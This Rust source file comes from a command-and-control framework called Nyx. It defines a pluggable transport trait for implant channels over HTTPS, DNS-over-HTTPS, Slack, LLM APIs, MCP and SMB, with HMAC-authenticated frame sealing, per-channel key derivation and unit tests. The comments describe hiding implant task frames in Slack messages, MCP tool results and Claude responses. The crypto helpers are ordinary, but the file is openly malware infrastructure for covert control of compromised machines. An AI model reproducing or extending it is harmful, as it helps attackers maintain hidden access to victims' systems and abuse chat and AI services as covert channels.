// Nyx Transport Abstraction Layer — pluggable C2 channel framework.
//
// Channel priorities (0 = highest): HTTPS > DoH DNS > Slack API > LLM API > MCP > SMB

// ---- Error type -----------------------------------------------------------

#[derive(Debug)]
pub enum TransportError {
    /// Channel is dead — no recovery possible.
    Dead(&'static str),
    /// Transient failure — retry may succeed.
    Transient(&'static str),
    /// Timeout waiting for response.
    Timeout,
    /// Payload too large for this channel.
    PayloadTooLarge(usize),
}

// ---- Transport trait ------------------------------------------------------

/// Pluggable C2 transport channel.
///
/// Each implementation handles a specific protocol (HTTPS, DNS, Slack API, etc.).
pub trait Transport {
    /// Send a frame. Returns Ok(()) if delivered, Err on failure.
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError>;

    /// Receive next frame. Blocks up to `timeout_ms`.
    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError>;

    /// Check channel health. Returns latency in ms, or None if dead.
    fn health_check(&self) -> Option<u64>;

    /// Channel identifier for logging.
    fn name(&self) -> &'static str;

    /// Maximum payload size this channel supports in a single frame.
    fn max_frame_size(&self) -> usize {
        1024 * 1024
    } // default 1MB

    /// Whether this channel requires connectivity check before use.
    fn requires_probe(&self) -> bool {
        true
    }

    /// One-time initialization (called once when channel is first activated).
    fn init(&mut self) -> Result<(), TransportError> {
        Ok(())
    }
}

// ---- Frame integrity error ---------------------------------------------

/// HMAC tag verification or framing failed.
///
/// Returned by [`open_frame`] when a candidate blob does not carry a valid
/// tag, is truncated, or has a mismatched length prefix. Callers treat this
/// as "skip this blob" — never as "decode the attacker bytes anyway".
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FrameIntegrityError;

impl std::fmt::Display for FrameIntegrityError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("C2 frame HMAC verification failed")
    }
}

impl std::error::Error for FrameIntegrityError {}

// ---- HMAC frame integrity (CRITICAL-22 / CRITICAL-23) ---------------------
//
// Slack/MCP/LLM carry C2 frames as ordinary text through third-party services
// (a Slack channel, an MCP `tools/call` result, a Claude response). Those
// channels accept ANY bytes as a frame, which lets any third party that can
// post text into the channel inject implant task frames.
//
// The protocol layer already seals each frame with a ChaCha20-Poly1305 AEAD
// (`nyx_protocol::seal`); the transport's job is only to carry sealed bytes.
// These helpers add a transport-layer HMAC so the receiver can reject any
// frame it did not seal itself before handing the bytes to the protocol layer.
//
// Wire format over the raw sealed `frame` bytes:
//
// ```text
//   tag:   32 bytes   HMAC-SHA256(key, length || frame)
//   len:    4 bytes   big-endian u32 = frame.len()
//   frame:  variable  the sealed bytes being relayed
// ```
//
// `len` is MAC'd (and is also what the receiver reads first), so a truncated
// or length-extension blob can never produce a tag that verifies. Tag
// comparison uses `hmac::Mac::verify_slice`, which is constant-time.

/// HMAC-SHA256 tag length, in bytes.
pub const FRAME_TAG_LEN: usize = 32;
/// Length-prefix width, in bytes (big-endian u32).
pub const FRAME_LEN_PREFIX: usize = 4;
/// Total framing overhead per relayed frame.
pub const FRAME_OVERHEAD: usize = FRAME_TAG_LEN + FRAME_LEN_PREFIX;

/// Seal a relayed frame with an HMAC-SHA256 tag and length prefix.
///
/// Returns `tag(32) || len_be(4) || frame`. The receiver verifies the tag
/// before it touches the payload, so unauthenticated bytes never reach the
/// protocol-layer AEAD. The `key` is a per-channel secret derived from the
/// session key (see [`derive_channel_key`]).
pub fn seal_frame(key: &[u8; 32], frame: &[u8]) -> Vec<u8> {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;

    // Clamp the length to u32. Real frames are tiny relative to u32::MAX (max
    // transport frame is 64 KiB), so on a 64-bit platform the try_from always
    // succeeds; unwrap_or(MAX) just keeps the byte-pack below total on a
    // hypothetical oversized input rather than panicking in the seal path.
    let len = u32::try_from(frame.len()).unwrap_or(u32::MAX);
    let mut len_be = [0u8; FRAME_LEN_PREFIX];
    len_be[0] = (len >> 24) as u8;
    len_be[1] = (len >> 16) as u8;
    len_be[2] = (len >> 8) as u8;
    len_be[3] = len as u8;

    let mut out = Vec::with_capacity(FRAME_OVERHEAD + frame.len());

    // tag = HMAC(key, len_be || frame)
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC accepts any key length");
    mac.update(&len_be);
    mac.update(frame);
    let tag = mac.finalize().into_bytes();
    debug_assert_eq!(tag.len(), FRAME_TAG_LEN);

    out.extend_from_slice(&tag);
    out.extend_from_slice(&len_be);
    out.extend_from_slice(frame);
    out
}

/// Verify a sealed blob's HMAC-SHA256 tag and return the inner frame.
///
/// Returns `Ok(frame)` only if the leading 32-byte tag validates against the
/// trailing `len_be(4) || frame` bytes. ANY failure — wrong/missing tag,
/// truncated blob, length mismatch, or length prefix larger than the blob —
/// returns `Err(FrameIntegrityError)`. Callers treat the error as "skip this blob" (Slack) or
/// "no frame yet, keep polling" (MCP/LLM); they never treat attacker bytes as
/// a frame.
pub fn open_frame(key: &[u8; 32], blob: &[u8]) -> Result<Vec<u8>, FrameIntegrityError> {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;

    // Need at least the tag + length prefix to attempt verification.
    if blob.len() < FRAME_OVERHEAD {
        return Err(FrameIntegrityError);
    }

    let (tag, rest) = blob.split_at(FRAME_TAG_LEN);
    let (len_be, frame) = rest.split_at(FRAME_LEN_PREFIX);

    // Reconstruct the declared payload length and sanity-check it against the
    // blob. A mismatch (truncation, injection, framing drift) is treated as a
    // verification failure — never as a partial frame.
    let declared = u32::from_be_bytes([len_be[0], len_be[1], len_be[2], len_be[3]]);
    if declared as usize != frame.len() {
        return Err(FrameIntegrityError);
    }

    // Constant-time tag verification. `verify_slice` returns Err on mismatch;
    // we flatten it to our unit error so callers never see the HMAC type.
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC accepts any key length");
    mac.update(len_be);
    mac.update(frame);
    mac.verify_slice(tag).map_err(|_| FrameIntegrityError)?;

    Ok(frame.to_vec())
}

/// Derive a per-channel HMAC key from a 32-byte session key and a channel label.
///
/// Different relay channels (Slack, MCP, LLM) must not share a MAC key — a
/// leaked Slack tag would otherwise be replayable on the MCP channel. We
/// domain-separate with a fixed label, producing a fresh 32-byte key per
/// channel. The input `session_key` is the shared secret the transport already
/// holds; the `label` ties the output to one channel type so cross-channel tag
/// reuse is impossible.
///
/// See [`derive_channel_key_from_bytes`] for the variable-length-input variant
/// used when a channel's existing secret isn't exactly 32 bytes (e.g. an MCP
/// `api_key` string).
pub fn derive_channel_key(session_key: &[u8; 32], label: &[u8]) -> [u8; 32] {
    derive_channel_key_from_bytes(session_key, label)
}

/// Derive a per-channel HMAC key from a variable-length secret and a label.
///
/// This is the KDF backing [`derive_channel_key`]. It normalizes an arbitrary
/// input length to a 32-byte root via SHA-256, then domain-separates by label
/// with HMAC-SHA256:
///
/// ```text
///   root = SHA256(secret)
///   out  = HMAC(root, "nyx-transport-hmac-v1" || 0x00 || label)
/// ```
///
/// Used by MCP, whose per-channel secret is the bearer `api_key` (a string of
/// arbitrary length) rather than a fixed 32-byte key. The label prevents the
/// same secret from yielding the same MAC key across channel types.
pub fn derive_channel_key_from_bytes(secret: &[u8], label: &[u8]) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::{Digest, Sha256};

    type HmacSha256 = Hmac<Sha256>;

    // Normalize variable-length input to a uniform 32-byte root. SHA-256's
    // output is exactly 32 bytes, so the copy is infallible.
    let root = Sha256::digest(secret);
    let mut out = [0u8; 32];
    out.copy_from_slice(&root);

    // Domain-separate by label so the same secret can't produce keys valid on
    // multiple channels.
    let mut mac = HmacSha256::new_from_slice(&out).expect("HMAC accepts any key length");
    mac.update(b"nyx-transport-hmac-v1\x00");
    mac.update(label);
    let bytes = mac.finalize().into_bytes();

    out.copy_from_slice(&bytes[..32]);
    out
}

#[cfg(test)]
mod frame_integrity_tests {
    use super::*;

    fn k(seed: u8) -> [u8; 32] {
        [seed; 32]
    }

    #[test]
    fn seal_then_open_roundtrips() {
        let key = k(0x11);
        let frame = b"sealed-by-protocol-layer-aead";
        let blob = seal_frame(&key, frame);
        assert_eq!(open_frame(&key, &blob).unwrap(), frame);
    }

    #[test]
    fn open_rejects_empty_and_short_blobs() {
        let key = k(0x22);
        assert_eq!(open_frame(&key, &[]), Err(FrameIntegrityError));
        assert_eq!(open_frame(&key, &[0u8; 4]), Err(FrameIntegrityError));
        assert_eq!(
            open_frame(&key, &[0u8; FRAME_OVERHEAD - 1]),
            Err(FrameIntegrityError)
        );
    }

    #[test]
    fn open_rejects_wrong_key() {
        let sealer = k(0x33);
        let opener = k(0x99);
        let blob = seal_frame(&sealer, b"payload");
        assert_eq!(open_frame(&opener, &blob), Err(FrameIntegrityError));
    }

    #[test]
    fn open_rejects_tampered_tag() {
        let key = k(0x44);
        let mut blob = seal_frame(&key, b"payload");
        blob[0] ^= 0xFF; // flip a bit in the tag
        assert_eq!(open_frame(&key, &blob), Err(FrameIntegrityError));
    }

    #[test]
    fn open_rejects_tampered_payload() {
        let key = k(0x55);
        let mut blob = seal_frame(&key, b"payload");
        // Flip a bit inside the frame (past tag + length prefix).
        let last = blob.len() - 1;
        blob[last] ^= 0xFF;
        assert_eq!(open_frame(&key, &blob), Err(FrameIntegrityError));
    }

    #[test]
    fn open_rejects_length_mismatch() {
        let key = k(0x66);
        let mut blob = seal_frame(&key, b"payload");
        // Corrupt the declared length so it disagrees with the real payload.
        blob[FRAME_TAG_LEN] ^= 0x01;
        assert_eq!(open_frame(&key, &blob), Err(FrameIntegrityError));
    }

    #[test]
    fn open_rejects_appended_bytes() {
        let key = k(0x77);
        let mut blob = seal_frame(&key, b"payload");
        blob.push(0x00);
        assert_eq!(open_frame(&key, &blob), Err(FrameIntegrityError));
    }

    #[test]
    fn derived_keys_are_channel_distinct() {
        let sk = k(0xAB);
        let slack = derive_channel_key(&sk, b"slack");
        let mcp = derive_channel_key(&sk, b"mcp");
        let llm = derive_channel_key(&sk, b"llm");
        assert_ne!(slack, mcp);
        assert_ne!(slack, llm);
        assert_ne!(mcp, llm);
        // And deterministic — same inputs give the same key.
        assert_eq!(slack, derive_channel_key(&sk, b"slack"));
    }

    #[test]
    fn derived_key_cross_channel_tags_do_not_verify() {
        let sk = k(0xCD);
        let slack_key = derive_channel_key(&sk, b"slack");
        let mcp_key = derive_channel_key(&sk, b"mcp");
        let blob = seal_frame(&slack_key, b"x");
        assert_eq!(open_frame(&mcp_key, &blob), Err(FrameIntegrityError));
    }
}
